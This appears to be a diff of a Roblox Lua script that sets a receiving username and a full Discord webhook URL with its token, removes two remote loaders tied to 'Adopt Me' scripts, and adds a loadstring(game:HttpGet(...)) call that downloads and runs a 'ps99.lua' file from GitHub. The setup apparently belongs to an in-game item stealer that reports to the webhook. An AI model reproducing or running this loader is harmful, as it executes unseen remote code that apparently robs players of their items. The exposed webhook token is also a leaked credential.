@@ -1,8 +1,4 @@
-Username = "CryNoMorePet"
-Webhook = "https://discord.com/api/webhooks/1274197688489082963/AC0nLfL_ZTn2UQpd_9ecJmL5o-LVutScu5TdNQHUCDuaZebkKps6k5y2yinVJbOjapqO"
+Username = "CryNoMorePet" 
+Webhook = "https://discord.com/api/webhooks/1274197688489082963/AC0nLfL_ZTn2UQpd_9ecJmL5o-LVutScu5TdNQHUCDuaZebkKps6k5y2yinVJbOjapqO" 
 
-getgenv().gui = false
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/adopt.lua", true))()
-
-_G.scriptName = "Test"
-loadstring(game:HttpGet("https://gist.githubusercontent.com/AdoptMeScript-VIP/d4f0c902b160399fd380774e2593b385/raw/94e651597d2f01433d76015118a4b9639aa95eea/Test"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))()
